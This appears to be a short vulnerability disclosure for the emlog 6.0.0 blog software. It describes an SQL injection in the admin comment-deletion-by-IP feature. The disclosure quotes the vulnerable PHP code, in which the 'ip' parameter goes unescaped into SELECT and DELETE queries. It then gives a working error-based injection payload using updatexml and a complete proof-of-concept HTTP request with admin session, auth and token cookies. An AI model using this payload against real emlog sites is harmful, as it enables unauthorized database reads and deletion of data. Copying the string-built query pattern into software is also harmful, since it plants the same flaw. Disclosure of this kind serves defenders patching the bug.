emlog has SQL injection vulnerability

vulnerability in admin/comment.php line 41:

if ($action== 'delbyip') {
    LoginAuth::checkToken();
    if (ROLE != ROLE_ADMIN) {
        emMsg('权限不足！', './');
    }
    $ip = isset($_GET['ip']) ? $_GET['ip'] : '';
    $Comment_Model->delCommentByIp($ip);
    $CACHE->updateCache(array('sta','comment'));
    emDirect("./comment.php?active_del=1");
}

vulnerability in include/lib/loginauth.php line 226:

public static function checkToken(){
	$token = isset($_REQUEST['token']) ? addslashes($_REQUEST['token']) : '';
	if ($token != self::genToken()) {
		emMsg('权限不足，token error');
	}
}

vulnerability in include/model/comment_model.php line 150:

function delCommentByIp($ip) {
        $blogids = array();
        $sql = "SELECT DISTINCT gid FROM ".DB_PREFIX."comment WHERE ip='$ip'";
        $query = $this->db->query($sql);
        while ($row = $this->db->fetch_array($query)) {
            $blogids[] = $row['gid'];
        }
        $this->db->query("DELETE FROM ".DB_PREFIX."comment WHERE ip='$ip'");
        $this->updateCommentNum($blogids);
    }

Login Required admin.
The token parameter constructed is the value of "EM_TOKENCOOKIE_..." in the cookie.
action=delbyip
ip=123' and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)%23

POC：
GET /admin/comment.php?action=delbyip&ip=123%27%20and%20updatexml(1,concat(0x7e,(SELECT%20@@version),0x7e),1)%23&token=665544d7a8c17d72576703859322548e HTTP/1.1
Host: 192.168.234.128
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=chk81h02l8rclkjbpdpm7ffjn3; EM_AUTHCOOKIE_ob0n96t5QV8HTVmXGtXUMPsWTSWNWSLZ=admin%7C%7Cae6c6d2833a616b48d91c52c029cb63e; EM_TOKENCOOKIE_ea9ab1c72af2adc42fabf01c92478f75=665544d7a8c17d72576703859322548e
Upgrade-Insecure-Requests: 1

An issue was discovered in emlog 6.0.0
There is a SQL injection vulnerability that via /admin/comment.php?action=delbyip&ip=123' and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)%23&token=665544d7a8c17d72576703859322548e